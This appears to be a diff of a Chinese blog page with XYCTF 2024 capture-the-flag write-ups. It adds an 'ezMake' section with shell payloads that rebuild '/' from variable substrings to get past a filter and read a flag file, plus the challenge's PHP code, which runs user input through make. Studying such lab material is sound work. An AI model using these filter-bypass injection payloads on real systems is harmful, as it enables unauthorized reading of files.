@@ -76,7 +76,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%CE%B5Z-%C2%BF%D0%BC-K%CE%B5%C2%BF"><span class="toc-number">2.1.</span> <span class="toc-text">εZ?¿м@Kε¿?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-number">2.1.1.</span> <span class="toc-text">正解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-unserialize"><span class="toc-number">2.2.</span> <span class="toc-text">baby_unserialize</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezMake"><span class="toc-number">2.1.</span> <span class="toc-text">ezMake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.1.</span> <span class="toc-text">构造linux命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9Ashell%E5%8F%98%E9%87%8F%E6%9B%BF%E6%8D%A2%E7%AC%A6%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.2.</span> <span class="toc-text">法二：shell变量替换符读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.3.</span> <span class="toc-text">非预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-Make"><span class="toc-number">2.2.</span> <span class="toc-text">ez?Make</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%CE%B5Z-%C2%BF%D0%BC-K%CE%B5%C2%BF"><span class="toc-number">2.3.</span> <span class="toc-text">εZ?¿м@Kε¿?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-number">2.3.1.</span> <span class="toc-text">正解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-unserialize"><span class="toc-number">2.4.</span> <span class="toc-text">baby_unserialize</span></a></li></ol></li></ol>
     </div>
   
         
@@ -248,7 +248,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Makefile/" style="color: #00a596">Makefile</a>
+                <a href="/blog/tags/Makefile/" style="color: #ff7d73">Makefile</a>
             </span>
             
         </span>
@@ -262,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">297字</span>
+        <span class="post-count">637字</span>
       </span>
     </span>
 
@@ -271,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">2分</span>
       </span>
     </span>
     
@@ -289,7 +289,69 @@
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>听说有java题就来看一眼，挑几题感兴趣的复现一下</p>
 <span id="more"></span>
 
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h2><blockquote>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h2><blockquote>
+<p>Makefile 构造命令执行</p>
+</blockquote>
+<p><img src="/blog/2024/04/25/XYCTF-2024/image-20240430013832109.png" alt="image-20240430013832109"></p>
+<p>随便输个命令发现可以命令执行，但是环境变量被清了导致得自己去&#x2F;bin里面取命令，flag在&#x2F;flag，但是直接输入&#x2F;flag发现被过滤了，测试一下发现<code>/</code>被过滤了</p>
+<p>先目录穿越看看结果</p>
+<p><img src="/blog/2024/04/25/XYCTF-2024/image-20240430014213930.png" alt="image-20240430014213930"></p>
+<p>我flag呢？破案了原来在&#x2F;var&#x2F;www&#x2F;html下</p>
+<h3 id="构造linux命令执行"><a href="#构造linux命令执行" class="headerlink" title="构造linux命令执行"></a>构造linux命令执行</h3><p>用<code>$&#123;PWD::$&#123;	#SHLVL	&#125;&#125;</code>构造<code>/</code>，注意带<code>$</code>的在这里都要双写</p>
+<p><img src="/blog/2024/04/25/XYCTF-2024/image-20240430020403248.png" alt="image-20240430020403248"></p>
+<p>最终payload：（自行去掉缩进）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">pwd</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">cd</span> bin<span class="token operator">&amp;&amp;</span><span class="token function">cat</span> $<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>$$&#123;	<span class="token operator">#</span>	&#125;</span>:$<span class="token variable">$&#123;	<span class="token operator">##</span>	&#125;</span><span class="token punctuation">&#125;</span>var$<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>$$&#123;	<span class="token operator">#</span>	&#125;</span>:$<span class="token variable">$&#123;	<span class="token operator">##</span>	&#125;</span><span class="token punctuation">&#125;</span>www$<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>$$&#123;	<span class="token operator">#</span>	&#125;</span>:$<span class="token variable">$&#123;	<span class="token operator">##</span>	&#125;</span><span class="token punctuation">&#125;</span>html$<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>$$&#123;	<span class="token operator">#</span>	&#125;</span>:$<span class="token variable">$&#123;	<span class="token operator">##</span>	&#125;</span><span class="token punctuation">&#125;</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/04/25/XYCTF-2024/image-20240430020556931.png" alt="image-20240430020556931"></p>
+<p>顺带拿个makefile.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\/|\n|\r|\;|\|/i'</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'makefileContent'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'failed'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'output'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$makefileContent</span> <span class="token operator">=</span> <span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>EOD</span>
+SHELL := /bin/bash
+
+ifndef PATH
+override PATH :=
+else
+override PATH :=
+endif
+
+.PHONY: FLAG
+FLAG: ./flag
+\t<span class="token interpolation"><span class="token variable">$cmd</span></span>
+<span class="token delimiter symbol">EOD<span class="token punctuation">;</span></span></span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Makefile'</span><span class="token punctuation">,</span> <span class="token variable">$makefileContent</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"make -f Makefile 2>&amp;1"</span><span class="token punctuation">;</span>
+        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'makefileContent'</span> <span class="token operator">=></span> <span class="token variable">$makefileContent</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'output'</span> <span class="token operator">=></span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'makefileContent'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'failed'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'output'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'failed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="法二：shell变量替换符读文件"><a href="#法二：shell变量替换符读文件" class="headerlink" title="法二：shell变量替换符读文件"></a>法二：shell变量替换符读文件</h3><p>shell变量替换符可以读文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token operator">&lt;</span>file<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/04/25/XYCTF-2024/image-20240430020842602.png" alt="image-20240430020842602"></p>
+<p>所以payload：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> $<span class="token variable"><span class="token variable">$(</span><span class="token operator">&lt;</span>flag<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>直接访问&#x2F;flag就能下载了</p>
+<hr>
+<h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h2><p>别急</p>
+<hr>
+<h2 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h2><blockquote>
 <p>Makefile 自动变量 + 报错读文件</p>
 </blockquote>
 <p>hint.php</p>
@@ -323,7 +385,7 @@
 
 <p><del>那么就是参考7字符的写shell，但是没字母怎么写？</del></p>
 <h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>这里有个坑点：不要试<code>$&gt;</code>，会导致重定向输出创建新文件，然后会影响后续判断依赖是FLAG导致读不了&#x2F;flag</p>
-<p>payload：利用<code>$&#123;&lt;/flag&#125;</code>报错带出flag</p>
+<p>payload：利用<code>$&#123;&lt;/flag&#125;</code>报错带出flag（这个payload前面几题也能用）</p>
 <pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token variable">$$</span><span class="token punctuation">(</span>&lt;<span class="token variable">$&lt;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/blog/2024/04/25/XYCTF-2024/image-20240429003328517.png" alt="image-20240429003328517"></p>
